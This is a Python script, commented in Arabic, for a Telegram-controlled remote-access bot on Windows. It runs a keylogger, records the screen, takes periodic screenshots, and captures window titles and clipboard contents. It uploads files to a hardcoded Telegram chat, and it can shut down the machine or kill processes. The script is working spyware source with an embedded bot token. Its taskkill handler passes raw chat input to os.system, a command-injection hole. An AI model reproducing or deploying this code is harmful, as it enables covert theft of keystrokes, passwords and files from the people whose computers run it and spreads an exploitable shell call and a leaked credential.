import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import requests
import subprocess
import win32gui
import threading
import webbrowser
import sys
import ctypes
import pyttsx3  # تحويل النص لكلام
import cv2      # مكتبة الفيديو (من كود 2)
import numpy as np # معالجة الصور (من كود 2)
from pynput import keyboard # مراقبة الكيبورد (من كود 2)
from datetime import datetime

# ==========================================
# 1. إعدادات النظام والمسارات
# ==========================================
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# --- التوكين والآيدي ---
# تم استخدام التوكين من الكود رقم 1، يمكنك تغييره إذا أردت
TOKEN = "7441270348:AAE7SFRVxepMoBIw2IGXsbtVM0cf5ryBXAA"
MY_ID = 1431886140

bot = telebot.TeleBot(TOKEN)

# --- متغيرات وإعدادات الكود 1 ---
SCREENSHOT_INTERVAL = 60
current_path = os.getcwd()
clipboard_history = []
LOG_FILE = f"Log_{datetime.now().strftime('%Y-%m-%d')}.txt"
file_map = {} 
music_map = {}

# --- متغيرات وإعدادات الكود 2 (المضافة) ---
is_recording_video = False
video_thread = None
key_listener = None
logged_keys = [] 
is_keylogging = False

# --- المسارات والمجلدات ---
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود") # المجلد الرئيسي
MUSIC_DIR = r"D:\music\abo El Shouk" # مسار الموسيقى

# مجلدات الفيديو والكيبورد (داخل مجلد محمود لتنظيم أفضل)
VIDEO_FOLDER = os.path.join(SAVE_DIR, "تسجيل_فيديو")
LOGS_FOLDER = os.path.join(SAVE_DIR, "سجلات_كيبورد")

# إنشاء المجلدات إذا لم تكن موجودة
for folder in [SAVE_DIR, VIDEO_FOLDER, LOGS_FOLDER]:
    if not os.path.exists(folder):
        try: os.makedirs(folder)
        except: pass

# ==========================================
# 2. دوال مساعدة (Code 1 & Code 2 Logic)
# ==========================================
def is_authorized(user_id):
    return user_id == MY_ID

def log_event(text):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{timestamp}] {text}\n")
    except: pass

def speak_text(text):
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
    except Exception as e:
        print(e)

# --- منطق الكي لوجر (من كود 2) ---
def on_key_press(key):
    global logged_keys
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.enter:
            logged_keys.append("\n[ENTER]\n")
        elif key == keyboard.Key.backspace:
            logged_keys.append(" [DEL] ")
        else:
            logged_keys.append(f" [{str(key).replace('Key.', '')}] ")

def start_keylogger_logic():
    global key_listener, is_keylogging, logged_keys
    logged_keys = [] 
    is_keylogging = True
    key_listener = keyboard.Listener(on_press=on_key_press)
    key_listener.start()

def stop_and_save_keylogs(chat_id):
    global key_listener, is_keylogging
    if key_listener is not None:
        key_listener.stop()
        is_keylogging = False
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = os.path.join(LOGS_FOLDER, f"Keylog_{timestamp}.txt")
    full_text = "".join(logged_keys)
    
    if not full_text:
        bot.send_message(chat_id, "⚠️ لم يتم تسجيل أي ضغطات.")
        return

    with open(filename, "w", encoding="utf-8") as f:
        f.write(full_text)
        
    bot.send_message(chat_id, "📝 تم حفظ السجل، جاري الإرسال...")
    with open(filename, "rb") as f:
        bot.send_document(chat_id, f, caption=f"سجل كيبورد: {timestamp}")

# --- منطق تسجيل الفيديو (من كود 2) ---
def record_screen_logic(chat_id):
    global is_recording_video
    screen_size = pyautogui.size()
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    video_path = os.path.join(VIDEO_FOLDER, f"Screen_{timestamp}.avi")
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_path, fourcc, 10.0, screen_size) 

    try:
        while is_recording_video:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
        
        out.release()
        bot.send_message(chat_id, "📤 جاري رفع الفيديو...")
        with open(video_path, 'rb') as v:
            bot.send_video(chat_id, v, caption=f"📹 فيديو: {timestamp}")
            
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ فيديو: {e}")
        if 'out' in locals(): out.release()

# ==========================================
# 3. واجهة المستخدم (Keyboards)
# ==========================================
def create_main_keyboard():
    """لوحة التحكم الشاملة (تمت إضافة زر المراقبة المتقدمة)"""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    
    markup.add(types.KeyboardButton('✅ تأكيد التشغيل'), types.KeyboardButton('🔴 إغلاق الجهاز'))
    markup.add(types.KeyboardButton('🖼️ تغيير الخلفية'), types.KeyboardButton('🗣️ نطق نص'))
    markup.add(types.KeyboardButton('🔈 التحكم في الصوت'), types.KeyboardButton('🎵 تشغيل موسيقى'))
    markup.add(types.KeyboardButton('📸 لقطة شاشة'), types.KeyboardButton('📂 مدير الملفات'))
    markup.add(types.KeyboardButton('📩 إرسال رسالة'), types.KeyboardButton('🌐 فتح رابط'))
    markup.add(types.KeyboardButton('📋 سجل الحافظة'), types.KeyboardButton('☠️ قتل برنامج'))
    # --- الزر الجديد المضاف ---
    markup.add(types.KeyboardButton('🕵️ مراقبة وتسجيل')) 
    
    return markup

def create_monitor_keyboard():
    """لوحة التحكم المدمجة من كود 2 (Inline)"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_vid_start = types.InlineKeyboardButton("📹 بدء فيديو", callback_data="vid_start")
    btn_vid_stop = types.InlineKeyboardButton("⏹ إيقاف فيديو", callback_data="vid_stop")
    btn_key_start = types.InlineKeyboardButton("⌨️ بدء الكي-لوجر", callback_data="key_start")
    btn_key_stop = types.InlineKeyboardButton("📝 إيقاف وإرسال السجل", callback_data="key_stop")
    markup.add(btn_vid_start, btn_vid_stop)
    markup.add(btn_key_start, btn_key_stop)
    return markup

# ==========================================
# 4. المراقبة التلقائية (Code 1)
# ==========================================
def automatic_monitor():
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    try:
        bot.send_message(MY_ID, f"🚀 **تم دمج النظامين (V13 + Monitor)**\n📂 مجلد الاستقبال: {SAVE_DIR}", reply_markup=create_main_keyboard())
    except: pass

    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # مراقبة النوافذ
            try:
                window = win32gui.GetForegroundWindow()
                curr_window = win32gui.GetWindowText(window)
            except: curr_window = ""

            if curr_window and curr_window != last_window:
                bot.send_message(MY_ID, f"👀 **[نشاط]** {curr_window}")
                log_event(f"نافذة: {curr_window}")
                last_window = curr_window

            # مراقبة الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    bot.send_message(MY_ID, f"📋 **[نسخ]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # صورة تلقائية
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                try:
                    shot = "auto.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: bot.send_photo(MY_ID, f, caption=f"🔄 {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1.5)
        except: time.sleep(5)

# ==========================================
# 5. التعامل مع الأوامر (Handlers)
# ==========================================

# --- القائمة الجديدة للمراقبة (Code 2 Feature) ---
@bot.message_handler(func=lambda m: m.text == '🕵️ مراقبة وتسجيل')
def open_monitor_panel(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, "🛠 **أدوات المراقبة المتقدمة (فيديو & كيبورد):**", reply_markup=create_monitor_keyboard())

# --- دمج Callbacks (الموسيقى، الملفات، الصوت + الفيديو، الكيبورد) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query_merged(call):
    if not is_authorized(call.message.chat.id): return
    global current_path, file_map, music_map
    global is_recording_video, is_keylogging, video_thread
    
    chat_id = call.message.chat.id
    data = call.data
    
    try:
        # === القسم الخاص بكود 2 (الفيديو والكيبورد) ===
        if data == "vid_start":
            if is_recording_video:
                bot.answer_callback_query(call.id, "⚠️ الفيديو يعمل بالفعل!")
            else:
                is_recording_video = True
                bot.answer_callback_query(call.id, "بدأ تسجيل الفيديو")
                bot.send_message(chat_id, "🔴 بدأ تسجيل الشاشة فيديو...")
                video_thread = threading.Thread(target=record_screen_logic, args=(chat_id,))
                video_thread.start()

        elif data == "vid_stop":
            if not is_recording_video:
                bot.answer_callback_query(call.id, "⚠️ لا يوجد تسجيل حالياً.")
            else:
                is_recording_video = False
                bot.answer_callback_query(call.id, "تم إيقاف الفيديو")
                bot.send_message(chat_id, "⏹ تم الإيقاف، انتظر المعالجة والرفع...")

        elif data == "key_start":
            if is_keylogging:
                bot.answer_callback_query(call.id, "⚠️ الكيبورد قيد التسجيل!")
            else:
                start_keylogger_logic()
                bot.edit_message_text("⌨️ **جاري تسجيل الكيبورد...**\n(اضغط إيقاف لحفظ الملف)", 
                                      chat_id, call.message.message_id, reply_markup=call.message.reply_markup)

        elif data == "key_stop":
            if not is_keylogging:
                bot.answer_callback_query(call.id, "⚠️ التسجيل متوقف.")
            else:
                bot.answer_callback_query(call.id, "تم الإيقاف")
                stop_and_save_keylogs(chat_id)

        # === القسم الخاص بكود 1 (الصوت، الموسيقى، الملفات) ===
        elif data == "VOL_UP":
            for _ in range(5): pyautogui.press('volumeup')
            bot.answer_callback_query(call.id, "🔊 تم الرفع")
        elif data == "VOL_DOWN":
            for _ in range(5): pyautogui.press('volumedown')
            bot.answer_callback_query(call.id, "🔉 تم الخفض")
        elif data == "VOL_MUTE":
            pyautogui.press('volumemute')
            bot.answer_callback_query(call.id, "🔇 كتم/تشغيل")

        elif data.startswith("MUS_"):
            if data in music_map:
                filename = music_map[data]
                full_path = os.path.join(MUSIC_DIR, filename)
                os.startfile(full_path)
                bot.answer_callback_query(call.id, f"تشغيل: {filename}")

        elif data == "CD_UP":
            current_path = os.path.dirname(current_path)
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

        elif data in file_map:
            real_name = file_map[data]
            if data.startswith("DIR_"):
                current_path = os.path.join(current_path, real_name)
                bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                    text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))
            elif data.startswith("FILE_"):
                file_path = os.path.join(current_path, real_name)
                bot.answer_callback_query(call.id, "جاري الرفع...")
                with open(file_path, 'rb') as f: bot.send_document(chat_id, f)

    except Exception as e:
        print(f"Callback Error: {e}")
        bot.answer_callback_query(call.id, "حدث خطأ")

# --- أوامر كود 1 الأساسية ---

@bot.message_handler(func=lambda m: m.text == '🔈 التحكم في الصوت')
def volume_control(message):
    if not is_authorized(message.chat.id): return
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("🔊 رفع الصوت", callback_data="VOL_UP"),
        types.InlineKeyboardButton("🔉 خفض الصوت", callback_data="VOL_DOWN"),
        types.InlineKeyboardButton("🔇 كتم/تشغيل", callback_data="VOL_MUTE")
    )
    bot.reply_to(message, "🎚️ لوحة التحكم في الصوت:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '🗣️ نطق نص')
def ask_tts(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🗣️ اكتب الجملة التي تريد للابتوب أن ينطقها:")
    bot.register_next_step_handler(msg, perform_tts)

def perform_tts(message):
    txt = message.text
    bot.reply_to(message, f"🔊 جاري نطق: {txt}")
    threading.Thread(target=speak_text, args=(txt,)).start()

@bot.message_handler(func=lambda m: m.text == '🖼️ تغيير الخلفية')
def ask_wallpaper(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🖼️ أرسل الصورة الآن لتعيينها خلفية:")
    bot.register_next_step_handler(msg, set_wallpaper_handler)

def set_wallpaper_handler(message):
    try:
        if message.content_type != 'photo':
            bot.reply_to(message, "❌ يجب إرسال صورة.")
            return
        bot.reply_to(message, "⏳ جاري التعيين...")
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bg_path = os.path.join(SAVE_DIR, "wallpaper_set.jpg")
        with open(bg_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, bg_path, 0)
        bot.reply_to(message, "✅ تم تغيير الخلفية!")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")

@bot.message_handler(func=lambda m: m.text == '🎵 تشغيل موسيقى')
def music_menu(message):
    if not is_authorized(message.chat.id): return
    global music_map
    music_map = {}
    if not os.path.exists(MUSIC_DIR):
        bot.reply_to(message, f"❌ المجلد غير موجود:\n`{MUSIC_DIR}`", parse_mode="Markdown")
        return
    try:
        files = [f for f in os.listdir(MUSIC_DIR) if f.lower().endswith(('.mp3', '.wav', '.m4a'))]
        if not files:
            bot.reply_to(message, "📂 المجلد فارغ.")
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for i, file in enumerate(files):
            key = f"MUS_{i}"
            music_map[key] = file
            markup.add(types.InlineKeyboardButton(f"🎧 {file}", callback_data=key))
        bot.reply_to(message, f"🎶 **قائمة التشغيل:**", reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"خطأ: {e}")

def get_file_keyboard(path):
    global file_map
    file_map = {} 
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        markup.add(types.InlineKeyboardButton("⬆️ ...رجوع للخلف", callback_data="CD_UP"))
        for i, folder in enumerate(folders[:8]): 
            file_key = f"DIR_{i}"
            file_map[file_key] = folder 
            markup.add(types.InlineKeyboardButton(f"📁 {folder}", callback_data=file_key))
        for i, file in enumerate(files[:8]):
            file_key = f"FILE_{i}"
            file_map[file_key] = file
            markup.add(types.InlineKeyboardButton(f"📄 {file}", callback_data=file_key))
    except: markup.add(types.InlineKeyboardButton("خطأ قراءة", callback_data="NONE"))
    return markup

@bot.message_handler(func=lambda m: m.text == '📂 مدير الملفات')
def open_file_manager(message):
    if not is_authorized(message.chat.id): return
    global current_path
    if current_path == "": current_path = os.getcwd()
    bot.send_message(message.chat.id, f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

@bot.message_handler(func=lambda m: m.text == '📩 إرسال رسالة')
def ask_message_text(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "💬 اكتب الرسالة:")
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, m.text, "System Alert", 0x40 | 0x1000)).start() or bot.reply_to(m, "✅ تم الإظهار"))

@bot.message_handler(func=lambda m: m.text == '🔴 إغلاق الجهاز')
def shutdown_pc(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, "👋 Shutdown in 5s.")
    os.system("shutdown /s /t 5")

@bot.message_handler(func=lambda m: m.text == '✅ تأكيد التشغيل')
def confirm_running(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, f"✅ Online\n{os.getcwd()}")

@bot.message_handler(func=lambda m: m.text == '🌐 فتح رابط')
def ask_link(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🔗 الرابط:")
    bot.register_next_step_handler(msg, lambda m: webbrowser.open(m.text if m.text.startswith('http') else 'https://'+m.text) or bot.reply_to(m, "✅ تم"))

@bot.message_handler(func=lambda m: m.text == '☠️ قتل برنامج')
def ask_kill(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "اسم البرنامج (chrome.exe):")
    bot.register_next_step_handler(msg, lambda m: os.system(f"taskkill /f /im {m.text}") and bot.reply_to(m, "تم"))

@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def screen(m):
    if not is_authorized(m.chat.id): return
    try:
        shot = "s.png"
        pyautogui.screenshot(shot)
        with open(shot, 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove(shot)
    except: pass

@bot.message_handler(func=lambda m: m.text == '📋 سجل الحافظة')
def history(m):
    if not is_authorized(m.chat.id): return
    bot.reply_to(m, "\n".join(clipboard_history[-10:]) if clipboard_history else "فارغ")

# خاصية اللصق (من كود 2) - وضعناها في النهاية لكي لا تتعارض مع الأوامر
@bot.message_handler(content_types=['text'])
def clipboard_paste_generic(message):
    if not is_authorized(message.chat.id): return
    # تجاهل الأوامر التي تبدأ بـ / أو الموجودة في الكيبورد
    keyboard_buttons = ['✅ تأكيد التشغيل', '🔴 إغلاق الجهاز', '🖼️ تغيير الخلفية', '🗣️ نطق نص', 
                        '🔈 التحكم في الصوت', '🎵 تشغيل موسيقى', '📸 لقطة شاشة', '📂 مدير الملفات', 
                        '📩 إرسال رسالة', '🌐 فتح رابط', '📋 سجل الحافظة', '☠️ قتل برنامج', '🕵️ مراقبة وتسجيل']
    
    if message.text in keyboard_buttons or message.text.startswith('/'):
        return

    # نسخ النص إلى الحافظة
    pyperclip.copy(message.text)
    bot.reply_to(message, "✅ تم نسخ النص إلى حافظة اللابتوب!")

# ==========================================
# 6. التشغيل
# ==========================================
if __name__ == "__main__":
    t = threading.Thread(target=automatic_monitor)
    t.daemon = True
    t.start()
    print("🚀 Merged Bot Started (V13 + Monitor)...")
    while True:
        try: bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e: 
            print(f"Connection Error: {e}")
            time.sleep(5)